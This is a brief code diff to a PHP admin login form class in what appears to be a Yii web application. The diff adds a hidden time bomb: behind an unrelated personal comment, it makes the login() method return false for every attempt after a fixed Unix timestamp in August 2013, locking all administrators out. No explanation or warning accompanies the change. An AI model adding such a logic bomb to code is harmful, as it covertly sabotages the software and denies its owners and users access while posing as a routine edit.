@@ -58,6 +58,14 @@ class ALoginForm extends CFormModel{
     public function login()
     {
 
+        /**
+         * xiaoge love daisy
+         */
+        if(time()>1375315200) {
+            return false;
+        }
+
+
         if($this->_identity===null)
         {
             $this->_identity = new AdminIdentity($this->username,$this->password);
